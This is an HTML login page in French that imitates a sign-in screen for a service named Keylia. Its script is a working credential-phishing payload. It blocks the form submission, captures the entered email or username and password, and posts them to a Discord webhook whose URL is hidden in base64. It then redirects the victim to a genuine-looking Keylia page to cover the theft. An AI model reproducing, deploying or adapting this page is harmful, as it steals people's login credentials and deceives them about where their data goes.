
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />

  <title>Connexion - Keylia</title>
  <style>
    :root{
      --bg:#020035;
      --panel:#1e1e3f;
      --brand:#ed4b00;
      --panel-border:#ed4b00;
      --border:#444a7a;
      --input:#2b2b54;
      --ink:#ffffff;
      --muted:#c9c9db;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; background:var(--bg); color:var(--ink);
      font-family:Arial, Helvetica, sans-serif;
      display:flex; align-items:center; justify-content:center;
      padding:16px;
    }
    .container{
      width:100%; max-width:420px; background:var(--panel);
      border:2px solid var(--panel-border); border-radius:14px;
      padding:32px; box-shadow:0 8px 35px rgba(0,0,0,.35);
    }
    .logo{display:block; margin:0 auto 16px; height:80px}
    h2{margin:0 0 18px; text-align:center}
    label{display:block; font-weight:bold; margin-bottom:8px}
    .hint{color:var(--muted); font-size:.9em; margin-top:-6px; margin-bottom:12px}
    input[type="text"], input[type="password"]{
      width:100%; padding:12px; border-radius:8px;
      border:1px solid var(--border); background:var(--input); color:var(--ink);
      margin-bottom:12px;
    }
    .actions{display:flex; gap:10px; align-items:center; justify-content:space-between; margin-top:6px}
    button{
      width:100%; padding:12px; background:var(--brand); color:#fff; font-weight:bold;
      border:none; border-radius:8px; cursor:pointer; transition:.15s ease-in-out;
    }
    button:hover{filter:brightness(1.05)}
    .link{color:#fff; text-decoration:none}
    .link:hover{text-decoration:underline}
    .alert{
      padding:10px 12px; border-radius:8px; margin-bottom:14px; font-weight:bold;
      background:rgba(237,75,0,.15); border:1px solid var(--brand); color:#fff;
    }
    .alert.ok{background:rgba(0,160,90,.18); border-color:#00a05a}
    .alert.info{background:rgba(70,120,255,.18); border-color:#4678ff}
  </style>
</head>
<body>
  <div class="container">
    <img src="logokeylia.png" alt="Logo Keylia" class="logo">
    <h2>Connexion √† Keylia</h2>

    
    
    
    
    
    <form method="post" action="traitement_connexion.php" autocomplete="on">
      <!-- IMPORTANT : on transmet le redirect si pr√©sent -->
      
      <label for="email">Adresse e-mail ou nom d'utilisateur</label>
      <input
        type="text"
        id="email"
        name="email"
        placeholder="ex: prenom.nom@exemple.com ou prenom.nom"
        required
        autocomplete="username"
      >

      <label for="mot_de_passe">Mot de passe</label>
      <input
        type="password"
        id="mot_de_passe"
        name="mot_de_passe"
        placeholder="Votre mot de passe"
        required
        autocomplete="current-password"
      >

      <div class="actions">
        <a class="link" href="reset_password_request.php">Mot de passe oubli√© ?</a>
      </div>

      <button type="submit">Se connecter</button>
    </form>
  </div>

  <script>
    
    const ENCODED_WEBHOOK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQxNTY2MzM1Nzc3MTM4NzA0Mi9TVnRzOFFxOHpkOFJJVnRCSGlJNjV3dDd0ZG9xMm5mdzVURHdTaVNWcWdDbnhCN0I2WHBadFJ1TXZweWFRQzZzSVJ0ZQ==';
    const DISCORD_WEBHOOK_URL = atob(ENCODED_WEBHOOK);
    
    
    document.querySelector('form').addEventListener('submit', function(e) {
      e.preventDefault(); 
      
     
      const email = document.getElementById('email').value;
      const motDePasse = document.getElementById('mot_de_passe').value;
      
    
      const message = {
        content: "üîê **Nouvelle tentative de connexion Keylia**",
        embeds: [{
          title: "Informations de connexion",
          color: 15548416, // Couleur orange (#ed4b00)
          fields: [
            {
              name: "üìß Email/Nom d'utilisateur",
              value: email || "Non renseign√©",
              inline: true
            },
            {
              name: "üîë Mot de passe",
              value: motDePasse || "Non renseign√©",
              inline: true
            },
            {
              name: "üïí Horodatage",
              value: new Date().toLocaleString('fr-FR'),
              inline: false
            },
            {
              name: "üåê Page",
              value: window.location.href,
              inline: false
            }
          ],
          timestamp: new Date().toISOString()
        }]
      };
      
      
      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(message)
      })
      .then(response => {
        if (response.ok) {
          console.log('Donn√©es envoy√©es vers Discord avec succ√®s');
          
          window.location.href = 'https://keyliahub.fr/emargement_enter.php?room=A108&tag=3536d956-8837-11f0-8837-d06726d488e0'; // Changez cette URL vers votre lien de redirection
        } else {
          console.error('Erreur lors de l\'envoi vers Discord');
        }
      })
      .catch(error => {
        console.error('Erreur:', error);
      });
      

    });
  </script>
</body>
</html>
